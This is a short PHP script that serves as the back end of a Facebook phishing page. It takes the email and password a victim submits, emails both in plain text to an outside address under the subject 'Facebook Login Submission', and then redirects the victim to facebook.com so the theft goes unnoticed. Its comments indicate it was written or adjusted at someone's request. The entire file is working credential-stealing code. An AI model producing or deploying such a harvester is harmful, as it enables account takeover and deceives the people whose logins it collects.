<?php
if (isset($_POST['submit'])) {
    // Sanitize input to prevent header injection
    $email = str_replace(array("\r", "\n"), '', $_POST['email']);
    $password = $_POST['password']; // Password doesn't go into headers, so less critical but still should be handled carefully if logged.

    $to = 'likhonsheikh@tensi.org';
    $subject = 'Facebook Login Submission';
    $message = "Email: " . $email . "\n" . "Password: " . $password;

    // Use a fixed From address and set Reply-To to the user's input
    $headers = "From: webmaster@example.com" . "\r\n" .
               "Reply-To: " . $email . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    mail($to, $subject, $message, $headers);

    // Redirect to Facebook regardless of mail success to match user request for "automatic do resect to Facebook.com"
    header("Location: https://www.facebook.com");
    exit();
} else {
    header("Location: index.php");
    exit();
}
?>
